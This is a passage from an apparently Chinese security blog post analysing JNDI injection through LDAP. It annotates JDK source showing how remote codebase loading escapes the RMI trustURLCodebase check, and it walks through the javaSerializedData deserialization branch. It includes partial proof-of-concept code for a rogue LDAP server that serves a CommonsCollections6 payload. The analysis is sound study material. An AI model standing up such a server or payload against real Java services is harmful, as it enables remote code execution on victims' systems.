读取目标类名（javaClassName）——必填，否则抛出属性不合法异常</span></span><br><span class="line">  <span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[CLASSNAME])) != <span class="literal">null</span>) &#123;</span><br><span class="line">      className = (String) attr.get();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidAttributesException</span>(JAVA_ATTRIBUTES[CLASSNAME] +</span><br><span class="line">                  <span class="string">&quot; attribute is required&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 读取工厂类名（javaFactory）</span></span><br><span class="line">  <span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[FACTORY])) != <span class="literal">null</span>) &#123;</span><br><span class="line">      factory = (String) attr.get();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 构造基本 Reference：</span></span><br><span class="line">  <span class="comment">// - 第1个参数：目标类名（最终要还原成的类型）</span></span><br><span class="line">  <span class="comment">// - 第2个参数：工厂类名（实现 ObjectFactory）</span></span><br><span class="line">  <span class="comment">// - 第3个参数：工厂类位置（factoryLocation / codebase），此处只取 codebases[0]</span></span><br><span class="line">  <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(</span><br><span class="line">      className,</span><br><span class="line">      factory,</span><br><span class="line">      (codebases != <span class="literal">null</span> ? codebases[<span class="number">0</span>] : <span class="literal">null</span>)</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 解析地址项（RefAddr）的字符串编码：</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * 每个地址值有两种编码形式（二选一）：</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   *   1) 文本形式：</span></span><br><span class="line"><span class="comment">   *      #posn#&lt;type&gt;#&lt;address&gt;</span></span><br><span class="line"><span class="comment">   *      - posn   : 插入位置（整数，下标），用于 Reference.add(posn, addr)</span></span><br><span class="line"><span class="comment">   *      - &lt;type&gt; : 地址类型（RefAddr.getType()），如 &quot;endpoint&quot;、&quot;url&quot; 等</span></span><br><span class="line"><span class="comment">   *      - &lt;address&gt;: 文本内容，作为 StringRefAddr 的内容</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   *   2) Base64 二进制形式：</span></span><br><span class="line"><span class="comment">   *      #posn#&lt;type&gt;##&lt;base64-encoded address&gt;</span></span><br><span class="line"><span class="comment">   *      - 末尾是 “##” 再跟 base64，解码后作为 BinaryRefAddr 的字节内容</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * 注意：REF_ADDR 属性通常是“多值”属性（即可能有多条），需要逐条解析并按 posn 插入。</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[REF_ADDR])) != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="comment">// [...]</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回构造完成的 Reference；后续会交由 ObjectFactory 进行还原</span></span><br><span class="line">  <span class="keyword">return</span> ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>由于这里是利用 JNDI 的 <code>References</code> 机制进行远程类加载，因此走的是第三个分支。之后会调用 <code>javax.naming.spi.DirectoryManager</code> 的静态方法 <code>getObjectInstance</code> 来获取 <code>decodeRmiObject</code> 返回的 <code>Reference</code> 对应的对象实例。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 包可见；由 DirectoryManager 和 NamingManager 使用的全局“工厂构建器”。</span></span><br><span class="line"><span class="comment"> * 若注册了它，优先通过它来生成 ObjectFactory（而不是走默认查找流程）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">ObjectFactoryBuilder</span> <span class="variable">object_factory_builder</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 访问全局 ObjectFactoryBuilder 的同步 getter。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">synchronized</span> ObjectFactoryBuilder <span class="title function_">getObjectFactoryBuilder</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> object_factory_builder;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据 refInfo + attrs 等信息“生成一个对象实例”的总入口（面向目录服务）。</span></span><br><span class="line"><span class="comment"> * 与 NamingManager.getObjectInstance 类似，但支持 DirObjectFactory，并把 Attributes 也传入。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 典型调用场景：JNDI 提供者（如 LDAP）拿到条目后，交给这里尝试：</span></span><br><span class="line"><span class="comment"> *   - 若是 Reference/Referenceable：按 Reference 指定的工厂去实例化</span></span><br><span class="line"><span class="comment"> *   - 若注册了自定义工厂/构建器：按注册顺序尝试</span></span><br><span class="line"><span class="comment"> *   - 若都不成功：返回原 refInfo（或目录上下文）本身</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">    <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                      Hashtable&lt;?,?&gt; environment, Attributes attrs)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        ObjectFactory factory;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1) 若存在全局 ObjectFactoryBuilder，则优先用它创建“专用”的 ObjectFactory</span></span><br><span class="line">        <span class="comment">//    ✅ 这里默认为 null</span></span><br><span class="line">        <span class="type">ObjectFactoryBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> getObjectFactoryBuilder();</span><br><span class="line">        <span class="keyword">if</span> (builder != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 尝试把 refInfo 视为 Reference（或 Referenceable）</span></span><br><span class="line">        <span class="comment">//    Reference：JNDI 的“延迟还原说明书”</span></span><br><span class="line">        <span class="comment">//    Referenceable：提供 getReference() 的对象，效果等同上</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">            ref = (Reference) refInfo;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">            ref = ((Referenceable) (refInfo)).getReference();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object answer;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 3) 若 Reference 明确指定了“工厂类名”（factoryClassName），按规范：</span></span><br><span class="line">            <span class="comment">//    —— 这是一个“专用工厂”指示，应“仅用它”去构造对象（exclusive）</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">            <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 从 Reference 中按类名 f 加载/创建工厂（可能涉及本地 classpath 或 codebase）</span></span><br><span class="line">                factory = getObjectFactoryFromReference(ref, f); <span class="comment">// 👈 关键：专用工厂加载</span></span><br><span class="line">                <span class="comment">// [...]</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// [...]</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>getObjectInstance</code> 默认情况下会调用 <code>getObjectFactoryFromReference</code> 获取并加载工厂类。</p>
<p>这里要注意的是前面 JNDI-RMI 远程加载类是在 <code> com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code> 添加的 <code>trustURLCodebase</code> 检查，随后该函数调用了 <code>getObjectFactoryFromReference</code> 获取并加载工厂类。</p>
<p>而 <code>getObjectFactoryFromReference</code> 函数本身并没有 <code>trustURLCodebase</code> 检查，因此使用 JNDI-LDAP 代替 JNDI-RMI 利用 JNDI 的 <code>References</code> 机制远程加载类可以绕过 <code>trustURLCodebase</code> 检查。</p>
<p>8u191开始进行新增了 <code>com.sun.jndi.ldap.object.trustURLCodebase</code> 属性：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用于控制“是否允许从任意 URL 的 code base 加载类”的系统属性名</span></span><br><span class="line"><span class="comment">// 对应命令行：-Dcom.sun.jndi.ldap.object.trustURLCodebase=true/false</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TRUST_URL_CODEBASE_PROPERTY</span> <span class="operator">=</span></span><br><span class="line">    <span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取该系统属性，判断是否允许从任意 URL code base 加载类</span></span><br><span class="line"><span class="comment">// 注意：这里读到的是“字符串”（&quot;true&quot;/&quot;false&quot;），不是 boolean。</span></span><br><span class="line"><span class="comment">// 后续代码通常会用 &quot;true&quot;.equalsIgnoreCase(trustURLCodebase) 来判断。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">trustURLCodebase</span> <span class="operator">=</span></span><br><span class="line">    AccessController.doPrivileged(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;String&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="comment">// 读取系统属性；若未设置则默认 &quot;false&quot;</span></span><br><span class="line">                <span class="comment">// 也就是默认“不信任”远程 URL codebase（8u191+ 的安全默认）</span></span><br><span class="line">                <span class="keyword">return</span> System.getProperty(TRUST_URL_CODEBASE_PROPERTY, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br></pre></td></tr></table></figure></div>

<p>并且在 <code>com.sun.jndi.ldap.VersionHelper12#loadClass</code> 增加了判断，导致该方法失效。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> className 必填，目标类的“完全限定名”（FQCN），例如 &quot;com.example.EvilFactory&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> codebase  必填，空格分隔的一组 URL 字符串，用作类加载的搜索路径</span></span><br><span class="line"><span class="comment"> *                  典型来源是 LDAP 条目里的 &quot;javaCodeBase&quot;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仅当系统属性 com.sun.jndi.ldap.object.trustURLCodebase 被设置为 &quot;true&quot; 时，</span></span><br><span class="line">    <span class="comment">// 才允许从任意 URL codebase 下载并加载类（8u191+ 默认是 false）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equalsIgnoreCase(trustURLCodebase)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 以“线程上下文类加载器”作为父加载器（TCCL：当前线程关联的 ClassLoader）</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> getContextClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 基于 codebase 构造一个 URLClassLoader</span></span><br><span class="line">        <span class="comment">// 注：getUrlArray(codebase) 会把用空格分隔的多个 URL 解析成 URL[]</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span></span><br><span class="line">                URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用上面这个含远程 URL 的 ClassLoader 去加载目标类</span></span><br><span class="line">        <span class="comment">// 这个重载通常会调用 Class.forName(className, false, cl) 或等价逻辑</span></span><br><span class="line">        <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 未开启信任远程 codebase：这里直接返回 null，表示“不要做远程加载”</span></span><br><span class="line">        <span class="comment">// 上层调用方据此会改走其它路径（例如尝试从本地 classpath 找工厂类，</span></span><br><span class="line">        <span class="comment">// 或放弃 Reference 分支并返回/抛错）</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="反序列化（17-0-13、11-0-25、8u461-前）"><a href="#反序列化（17-0-13、11-0-25、8u461-前）" class="headerlink" title="反序列化（17.0.13、11.0.25、8u461 前）"></a>反序列化（17.0.13、11.0.25、8u461 前）</h4><p>前面提到 <code>com.sun.jndi.ldap.Obj#decodeObject</code> 有三个分支，其中对于 <strong><code>javaSerializedData</code> 分支</strong>，若条目包含序列化字节属性 <code>javaSerializedData</code> 则会调用 <code>deserializeObject</code> 函数将其反序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// —— 📌 分支 1：javaSerializedData —— //</span></span><br><span class="line"><span class="comment">// 若条目包含序列化字节（&quot;javaSerializedData&quot;），则按该 codebase 构造类加载器，</span></span><br><span class="line"><span class="comment">// 用它来反序列化成对象（需要能解析到类定义）。</span></span><br><span class="line"><span class="keyword">if</span> ((attr = attrs.get(JAVA_ATTRIBUTES[SERIALIZED_DATA])) != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> helper.getURLClassLoader(codebases); <span class="comment">// 可能返回 URLClassLoader 或 null</span></span><br><span class="line">    <span class="keyword">return</span> deserializeObject((<span class="type">byte</span>[]) attr.get(), cl);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>deserializeObject</code> 逻辑很简单，就是直接将字节数组 <code>obj</code> 反序列化成一个对象返回，而这里 <code>obj</code> 实际上就是前面的 <code>javaSerializedData</code> 属性的值。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 将字节数组反序列化为对象。</span></span><br><span class="line"><span class="comment"> * @param obj 承载 Java 序列化数据的字节数组（通常来自 javaSerializedData）</span></span><br><span class="line"><span class="comment"> * @param cl  反序列化时用于解析类的 ClassLoader；为 null 则使用默认解析逻辑</span></span><br><span class="line"><span class="comment"> * @return    反序列化得到的对象</span></span><br><span class="line"><span class="comment"> * @throws NamingException 将底层的 IO/ClassNotFound 异常包装为 JNDI 的命名异常抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">deserializeObject</span><span class="params">(<span class="type">byte</span>[] obj, ClassLoader cl)</span></span><br><span class="line">        <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 用字节数组构造一个输入流，作为反序列化的数据来源</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// try-with-resources：确保对象输入流在读取结束后被自动关闭</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">deserial</span> <span class="operator">=</span> (cl == <span class="literal">null</span>)</span><br><span class="line">                <span class="comment">// 未指定自定义类加载器：使用标准的 ObjectInputStream，</span></span><br><span class="line">                <span class="comment">// 其默认的类解析逻辑（resolveClass）由 JVM 决定</span></span><br><span class="line">                ? <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes)</span><br><span class="line">                <span class="comment">// 指定了自定义类加载器：使用 LoaderInputStream 包装，</span></span><br><span class="line">                <span class="comment">// 其 resolveClass 会优先用传入的 cl 去加载类（避免依赖默认加载器）</span></span><br><span class="line">                : <span class="keyword">new</span> <span class="title class_">LoaderInputStream</span>(bytes, cl)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取一个对象</span></span><br><span class="line">            <span class="keyword">return</span> deserial.readObject();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="comment">// 反序列化过程中找不到所需类：转换为 NamingException 并附带根因</span></span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">            ne.setRootCause(e);</span><br><span class="line">            <span class="keyword">throw</span> ne;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="comment">// 反序列化过程中发生 I/O 异常（流损坏、版本不匹配等）：</span></span><br><span class="line">        <span class="comment">// 同样包装为 NamingException 抛出</span></span><br><span class="line">        <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">        ne.setRootCause(e);</span><br><span class="line">        <span class="keyword">throw</span> ne;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们只需要将 LDAP 服务器的 <code>entry</code> 中的 <code>javaSerializedData</code> 设置为反序列化数据即可完成利用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.*;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.*;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JNDI-LDAP 反序列化服务器（javaSerializedData 分支，PoC 用）</span></span><br><span class="line"><span class="comment"> * - 使用 UnboundID 内存型 LDAP 服务器</span></span><br><span class="line"><span class="comment"> * - 拦截任意 search 请求，直接返回携带 javaSerializedData 的条目</span></span><br><span class="line"><span class="comment"> * - 客户端 JNDI-LDAP 提供者若按对象解析，将对该字节流进行反序列化</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 注意：</span></span><br><span class="line"><span class="comment"> * - 本分支与远程 codebase 无关（不受 com.sun.jndi.ldap.object.trustURLCodebase 影响）</span></span><br><span class="line"><span class="comment"> * - 现代 JDK 通常启用了 JEP 290 反序列化过滤，可能直接拦截该负载</span></span><br><span class="line"><span class="comment"> * - 这里固定回 DN=BASE 的条目，省事但不“像真服”（忽略请求的 baseDN/scope）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line">    <span class="comment">// 目录根 DN（条目的“住址”根），客户端最好以此为 baseDN 查询</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line">    <span class="comment">// 演示端口（标准 LDAP 明文是 389，PoC 常用不冲突的 1389）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PORT</span> <span class="operator">=</span> <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1) 准备反序列化字节（示例使用 CommonsCollections6 链）</span></span><br><span class="line">        <span class="type">byte</span>[] payload = CommonsCollections6.getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 以 BASE 为根创建内存 LDAP 配置</span></span><br><span class="line">        <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">cfg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(BASE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 启用 IPv4 监听</span></span><br><span class="line">        cfg.setListenerConfigs(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                        <span class="string">&quot;v4&quot;</span>,                                <span class="comment">// 监听器名字</span></span><br><span class="line">                        InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),    <span class="comment">// 监听地址（IPv4 全接口）</span></span><br><span class="line">                        PORT,                                 <span class="comment">// 监听端口</span></span><br><span class="line">                        ServerSocketFactory.getDefault(),     <span class="comment">// 明文 server socket 工厂</span></span><br><span class="line">                        SocketFactory.getDefault(),           <span class="comment">// client socket 工厂（一般用不到）</span></span><br><span class="line">                        (SSLSocketFactory) SSLSocketFactory.getDefault() <span class="comment">// 可用于 StartTLS/LDAPS，这里未启用</span></span><br><span class="line">                )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 注册拦截器：拦截 search 并直接回“包含序列化数据”的条目</span></span><br><span class="line">        cfg.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">SerializedInterceptor</span>(payload));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5) 启动内存服务器</span></span><br><span class="line">        <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(cfg);</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] LDAP listening on 0.0.0.0:&quot;</span> + PORT);</span><br><span class="line">        ds.startListening();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 搜索结果拦截器：</span></span><br><span class="line"><span class="comment">     * - 不管客户端查什么 DN，一律返回一个固定 DN=BASE 的条目</span></span><br><span class="line"><span class="comment">     * - 条目属性使用“javaSerializedObject”编码（携带 javaSerializedData）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SerializedInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Entry entry;</span><br><span class="line"></span><br><span class="line">        SerializedInterceptor(<span class="type">byte</span>[] payload) &#123;</span><br><span class="line">            <span class="comment">// 固定使用 BASE 作为返回条目的 DN（PoC 简化；真实服务器通常回请求里的 DN）</span></span><br><span 